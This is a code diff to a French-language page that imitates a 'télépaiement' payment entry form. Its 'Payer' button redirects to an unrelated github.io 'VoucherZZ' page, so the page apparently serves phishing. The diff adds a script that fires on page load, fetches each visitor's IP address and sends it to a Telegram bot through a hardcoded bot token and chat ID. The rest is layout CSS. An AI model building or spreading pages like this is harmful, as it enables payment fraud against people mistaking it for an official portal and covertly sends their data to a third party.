@@ -13,7 +13,7 @@
         }
         .header {
             width: 100%;
-            height: 60vh; /* Increased height for the header */
+            height: 90vh; /* Further increased height for the header */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -23,11 +23,11 @@
             max-width: 100%;
             max-height: 100%;
             object-fit: contain;
-            width: auto; /* Ensure the image scales correctly */
-            height: auto; /* Ensure the image scales correctly */
+            width: auto;
+            height: auto;
         }
         .content {
-            padding: 20px;
+            padding: 10px; /* Reduced padding to reduce space between images */
         }
         .form-container {
             max-width: 500px;
@@ -65,40 +65,76 @@
                 height: auto;
             }
             .header img {
-                max-height: 40vh; /* Increased height for smaller screens */
+                max-height: 50vh; /* Further increased height for smaller screens */
             }
             .button-zone button {
                 padding: 12px 30px;
             }
         }
     </style>
+    <script>
+        // Function to send an alert to Telegram
+        function sendTelegramAlert(ip) {
+            const telegramBotToken = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k'; // Replace with your bot token
+            const chatId = '7747778364'; // Replace with your chat ID
+            const message = `New visitor on the site! IP Address: ${ip}`;
+            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+            fetch(url)
+                .then(response => response.json())
+                .then(data => console.log('Success:', data))
+                .catch((error) => console.error('Error:', error));
+        }
+        // Function to get the user's IP address
+        function getUserIP() {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    sendTelegramAlert(ip);
+                })
+                .catch((error) => console.error('Error getting IP:', error));
+        }
+        // Trigger the functions when the page loads
+        window.onload = function() {
+            getUserIP();
+        };
+    </script>
 </head>
 <body>
-    <div class="header">
-        <a href="https://ibb.co/Q3BNnVhd"><img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" border="0" /></a>
+
+        <a href="https://i.ibb.co/v65PmWfY/Cu.jpg">
+            <img src="https://i.ibb.co/v65PmWfY/Cu.jpg" alt="Cu" loading="lazy" />
+            <source media="(min-width: 768px)" srcset="https://i.ibb.co/v65PmWfY/Cu.jpg 2x" />
+        </a>
     </div>
+
     <div class="content">
-        <center><a href="https://imgbb.com/"><img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" border="0" style="max-width: 100%; height: auto;" /></a></center>
-       <div class="form-container">
-            
-        <center><h3>Saisie du numéro de télépaiement</h3>
-         
-       
-            <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
-                
-              <div class="input-group">
-                    <label for="numeroTelepaiement">Numéro de télépaiement :</label>
-                  
-                    <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
-                </div>
-                <div class="input-group">
-                    <label for="cle">Clé :</label>
-                    <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
-                </div>
-                <center><div class="button-zone">
-                    <button type="submit">Payer</button>
-                </div>
-            </form>
+        <center>
+            <a href="https://imgbb.com/">
+                <img src="https://i.ibb.co/WWx1pZ4n/e.jpg" alt="e" loading="lazy" style="max-width: 100%; height: auto;" />
+                <source media="(min-width: 768px)" srcset="https://i.ibb.co/WWx1pZ4n/e.jpg 2x" />
+            </a>
+        </center>
+
+        <div class="form-container">
+            <center>
+                <h3>Saisie du numéro de télépaiement</h3>
+                <form id="saisie" onsubmit="window.location.href='https://justmoicom.github.io/VoucherZZ/'; return false;">
+                    <div class="input-group">
+                        <label for="numeroTelepaiement">Numéro de télépaiement :</label>
+                        <input type="tel" id="numeroTelepaiement" maxlength="22" required placeholder="Numéro de télépaiement" value="123456789012345678">
+                    </div>
+                    <div class="input-group">
+                        <label for="cle">Clé :</label>
+                        <input type="tel" id="cle" maxlength="2" required placeholder="Clé" value="12">
+                    </div>
+                    <center>
+                        <div class="button-zone">
+                            <button type="submit">Payer</button>
+                        </div>
+                    </center>
+                </form>
+            </center>
         </div>
     </div>
     <div class="footer-copyright">
